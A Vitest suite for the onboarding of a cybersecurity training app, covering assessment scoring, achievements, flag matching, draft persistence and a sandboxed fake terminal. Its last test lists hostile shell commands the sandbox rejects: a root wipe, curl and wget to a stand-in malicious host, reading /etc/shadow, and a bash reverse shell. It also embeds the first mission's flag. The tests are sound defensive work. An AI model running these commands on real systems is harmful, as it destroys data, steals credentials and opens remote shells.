import { describe, it, expect, beforeEach } from 'vitest';
import { ASSESSMENT_QUESTIONS } from '../components/onboarding/OnboardingStepAssessment';
import { ACHIEVEMENTS_DATA } from '../data/mockData';

describe('MY CYBER LAB Onboarding QA & Security Verification Suite', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  it('1. Verifies all 10 Skill Assessment questions have valid answer keys and explanations', () => {
    expect(ASSESSMENT_QUESTIONS.length).toBe(10);
    ASSESSMENT_QUESTIONS.forEach(q => {
      expect(q.id).toBeDefined();
      expect(q.category).toBeDefined();
      expect(q.question.length).toBeGreaterThan(10);
      expect(q.options.length).toBe(4);
      expect(q.correctIndex).toBeGreaterThanOrEqual(0);
      expect(q.correctIndex).toBeLessThan(4);
      expect(q.explanation.length).toBeGreaterThan(10);
    });
  });

  it('2. Correctly calculates category percentages from user assessment answers', () => {
    // Simulate user answering 10 questions with 8 correct
    const sampleAnswers: Record<number, number> = {
      0: ASSESSMENT_QUESTIONS[0].correctIndex,
      1: ASSESSMENT_QUESTIONS[1].correctIndex,
      2: ASSESSMENT_QUESTIONS[2].correctIndex,
      3: ASSESSMENT_QUESTIONS[3].correctIndex,
      4: ASSESSMENT_QUESTIONS[4].correctIndex,
      5: ASSESSMENT_QUESTIONS[5].correctIndex,
      6: (ASSESSMENT_QUESTIONS[6].correctIndex + 1) % 4, // incorrect
      7: ASSESSMENT_QUESTIONS[7].correctIndex,
      8: (ASSESSMENT_QUESTIONS[8].correctIndex + 1) % 4, // incorrect
      9: ASSESSMENT_QUESTIONS[9].correctIndex
    };

    const categoryTotals: Record<string, { correct: number; total: number }> = {};
    ASSESSMENT_QUESTIONS.forEach((q, idx) => {
      const cat = q.category;
      if (!categoryTotals[cat]) categoryTotals[cat] = { correct: 0, total: 0 };
      categoryTotals[cat].total += 1;
      if (sampleAnswers[idx] === q.correctIndex) {
        categoryTotals[cat].correct += 1;
      }
    });

    const scores: Record<string, number> = {};
    Object.entries(categoryTotals).forEach(([cat, stats]) => {
      scores[cat] = Math.round((stats.correct / stats.total) * 100);
    });

    expect(scores['Computer Fundamentals']).toBe(100);
    expect(scores['Linux']).toBe(100);
    expect(scores['Python']).toBe(100);
    expect(scores['Security Concepts']).toBe(100);
    expect(scores['Web Security']).toBe(50); // 1 of 2 correct
    expect(scores['Networking']).toBe(50); // 1 of 2 correct
  });

  it('3. Verifies default baseline scores for users who skip assessment', () => {
    const defaultScores: Record<string, number> = {
      'Computer Fundamentals': 50,
      'Networking': 30,
      'Linux': 30,
      'Python': 20,
      'Web Security': 20,
      'Security Concepts': 40
    };

    expect(defaultScores['Computer Fundamentals']).toBeGreaterThan(0);
    expect(defaultScores['Networking']).toBeGreaterThan(0);
    expect(defaultScores['Linux']).toBeGreaterThan(0);
  });

  it('4. Verifies First Step achievement exists and is configured for +100 XP reward', () => {
    const firstStepAch = ACHIEVEMENTS_DATA.find(a => a.id === 'ach-first-step');
    expect(firstStepAch).toBeDefined();
    expect(firstStepAch?.title).toBe('First Step');
    expect(firstStepAch?.xpReward).toBe(100);
    expect(firstStepAch?.unlocked).toBe(false);
  });

  it('5. Verifies First Mission token matching and rejects invalid tokens', () => {
    const EXPECTED_FLAG = 'MCL{first_step_completed}';
    
    // Valid input
    expect('MCL{first_step_completed}'.trim()).toBe(EXPECTED_FLAG);
    expect('  MCL{first_step_completed}  '.trim()).toBe(EXPECTED_FLAG);

    // Invalid inputs
    expect('MCL{wrong_token}'.trim() === EXPECTED_FLAG).toBe(false);
    expect('FLAG{first_step_completed}'.trim() === EXPECTED_FLAG).toBe(false);
    expect(''.trim() === EXPECTED_FLAG).toBe(false);
  });

  it('6. Verifies localStorage draft persistence and reload recovery serialization', () => {
    const draftState = {
      step: 3,
      experience: 'some_linux',
      selectedRole: 'penetration-tester',
      learningGoals: ['goal-ethical-hacking', 'goal-web-security'],
      assessmentScores: { 'Linux': 100, 'Networking': 80 },
      assessmentCompleted: true
    };

    localStorage.setItem('mcl_onboarding_draft', JSON.stringify(draftState));
    localStorage.setItem('mcl_onboarding_step', '3');

    const recoveredDraft = JSON.parse(localStorage.getItem('mcl_onboarding_draft') || '{}');
    const recoveredStep = parseInt(localStorage.getItem('mcl_onboarding_step') || '0', 10);

    expect(recoveredStep).toBe(3);
    expect(recoveredDraft.experience).toBe('some_linux');
    expect(recoveredDraft.selectedRole).toBe('penetration-tester');
    expect(recoveredDraft.learningGoals.length).toBe(2);
    expect(recoveredDraft.assessmentScores['Linux']).toBe(100);
  });

  it('7. Verifies sandboxed command dispatcher rejects arbitrary shell commands', () => {
    const forbiddenCommands = [
      'rm -rf /',
      'curl http://malicious.site',
      'wget http://malicious.site/script.sh',
      'cat /etc/shadow',
      'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
    ];

    forbiddenCommands.forEach(cmd => {
      let output = '';
      const cmdLower = cmd.toLowerCase();
      if (cmdLower === 'help') output = 'help';
      else if (cmdLower === 'whoami') output = 'operator';
      else if (cmdLower === 'pwd') output = '/home/operator/recon_sandbox';
      else if (cmdLower === 'ls' || cmdLower === 'ls -la' || cmdLower === 'ls -a' || cmdLower === 'ls -l') output = 'files';
      else if (cmdLower === 'cat evidence.txt' || cmdLower === 'cat flag.txt') output = 'token';
      else output = `zsh: command not found: ${cmd}`;

      expect(output.startsWith('zsh: command not found:')).toBe(true);
    });
  });
});
